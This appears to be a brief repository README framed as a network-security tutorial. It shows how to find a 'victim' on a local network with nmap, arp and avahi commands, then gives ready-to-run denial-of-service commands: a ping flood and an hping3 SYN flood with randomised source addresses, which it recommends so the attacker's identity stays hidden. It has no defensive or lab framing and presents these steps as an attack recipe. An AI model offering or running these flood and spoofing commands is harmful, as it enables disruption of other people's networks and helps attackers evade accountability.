# Network-Security
## getting info about devices connected to your local network
to start an attack you should first get some basic information about your victim, like ip address.
my favorite command is the last one, but it requires the installation of avahi.
The first thing to get into network security is to learn how to use nmap. There is a tutorial in this repo for that.
we can use one or more of the following commands to get that info:
```
nmap -sP 192.168.1.0/24
arp -a
arp
avahi-discover
avahi-browse -rat
```
## ping flooding (DOS attack)
ping flood basically floods the target pc with lots of ping requests so that it cannot access any other internet resource.
But it will also flood your pc with ping responses, so use this command only if you are sure that your pc has greater speed than the victim.
command:
```
  ping -f -s 65500 ip(or website)
```

However, there are more sophisticated tools available at our disposal like Hping3
using hping we can easily spoof our ips, so that your identity remains secure while doing the attacks
after installing hping3, we can use the following commands:

```
  hping3 -S -P -U --flood -V --rand-source website(or ip)
```
